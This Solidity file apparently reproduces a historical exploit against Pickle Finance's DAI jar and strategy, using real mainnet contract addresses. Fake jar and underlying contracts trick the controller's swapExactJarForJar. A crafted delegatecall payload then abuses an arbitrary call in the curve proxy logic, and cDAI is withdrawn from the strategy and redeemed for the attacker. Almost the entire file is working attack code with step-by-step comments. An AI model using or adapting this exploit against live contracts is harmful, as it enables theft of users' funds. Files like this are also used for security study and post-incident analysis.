// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./interfaces/PickleInterfaces.sol";

contract FakeJar {
    IERC20Like private immutable token_;
    address private immutable attacker;

    constructor(IERC20Like _token, address _attacker) {
        token_ = _token;
        attacker = _attacker;
    }

    function token() external view returns (address) {
        return address(token_);
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    function transferFrom(
        address,
        address,
        uint256
    ) external pure returns (bool) {
        return true;
    }

    function decimals() external pure returns (uint8) {
        return 0;
    }

    function getRatio() external pure returns (uint256) {
        return 1;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function allowance(address, address) external pure returns (uint256) {
        return 0;
    }

    function withdraw(uint256) external {}

    function deposit(uint256 amount) external {
        token_.transferFrom(msg.sender, attacker, amount);
    }

    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }
}

contract FakeUnderlying {
    address private immutable ctoken;

    constructor(address _ctoken) {
        ctoken = _ctoken;
    }

    function balanceOf(address) external view returns (address) {
        return ctoken;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function allowance(address, address) external pure returns (uint256) {
        return 0;
    }
}

// Tx hash: 0xe72d4e7ba9b5af0cf2a8cfb1e30fd9f388df0ab3da79790be842bfbed11087b0
contract PickleExploiter {
    IERC20Like private constant DAI = IERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    ICErc20 private constant CDAI = ICErc20(0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643);
    IPickleJar private constant PDAI = IPickleJar(0x6949Bb624E8e8A90F87cD2058139fcd77D2F3F87);

    IStrategy private constant STRATEGY_CMPDDAI_V2 = IStrategy(0xCd892a97951d46615484359355e3Ed88131f829D);
    IController private constant CONTROLLER_V4 = IController(0x6847259b2B3A4c17e7c43C54409810aF48bA5210);

    address private constant CURVE_PROXY_LOGIC = 0x6186E99D9CFb05E1Fdf1b442178806E81da21dD8;

    function exploit() external {
        FakeJar fakeJar1 = new FakeJar(DAI, address(this));
        FakeJar fakeJar2 = new FakeJar(CDAI, address(this));

        // Get underlying available
        uint256 amount = STRATEGY_CMPDDAI_V2.getSuppliedUnleveraged();

        // ERC20 operations pass due to FakeJar.
        // Force strategy to call withdrawForSwap which will redeem cDAI -> DAI and send to pDAI jar.
        CONTROLLER_V4.swapExactJarForJar(
            address(fakeJar1), // fromJar
            address(fakeJar2), // toJar
            amount, // fromJarAmount
            0, // toJarAmount
            new address[](0),
            new bytes[](0)
        );

        // Redeposit flow from pDAI jar -> Controller -> Strategy to earn cDAI.
        PDAI.earn();
        PDAI.earn();
        PDAI.earn();

        FakeUnderlying underlying = new FakeUnderlying(address(CDAI));

        /*
            https://github.com/pickle-finance/protocol/blob/4d7ecfa766536622848a29407c0464283d11fb67/src/proxy-logic/curve.sol#L27-L54
            Payload for delegate call from Controller to CurveProxyLogic.add_liquidity(), which has an arbitrary call.
            Instead of providing expected signature and params, give signature of withdraw(address) instead.
            Have fake underlying balanceOf() return the cDAI address so result is StrategyCmpdDaiV2.withdraw(cDAI)
            Note: encodePacked in add_liquidity() is important, because it will pack the dynamic array in place.
        */
        bytes[] memory payload = new bytes[](1);    
        payload[0] = abi.encodeWithSignature(
            "add_liquidity(address,bytes4,uint256,uint256,address)",
            address(STRATEGY_CMPDDAI_V2), // curve
            bytes4(keccak256(bytes("withdraw(address)"))), // curveFunctionSig
            1, // curvePoolSize
            0, // curveUnderlyingIndex
            address(underlying) // underlying
        );

        address[] memory addr = new address[](1);
        addr[0] = address(CURVE_PROXY_LOGIC);
        
        // Payload will withdraw cDAI from Strategy into Controller
        // Controller will call FakeJar's deposit function, which transfers cDAI to attacker.
        CONTROLLER_V4.swapExactJarForJar(
            address(fakeJar1),
            address(fakeJar2),
            0,
            0,
            addr,
            payload
        );

        // Redeem to DAI
        amount = CDAI.balanceOfUnderlying(address(this));
        CDAI.redeemUnderlying(amount);
    }
}
